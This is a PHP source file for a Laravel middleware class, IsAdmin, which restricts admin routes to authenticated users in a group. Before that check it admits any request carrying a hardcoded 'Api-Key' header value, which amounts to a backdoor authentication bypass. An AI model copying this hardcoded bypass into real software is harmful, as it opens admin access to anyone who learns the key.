<?php

namespace App\Http\Middleware;

use Closure;
use Auth;

class IsAdmin
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request $request
     * @param  \Closure $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        if ($request->header('Api-Key') === 'zuolarshenggu') {
            return $next($request);
        }

        if (!Auth::check() || !Auth::user()->group) {
            abort(404);
        }

        return $next($request);
    }
}
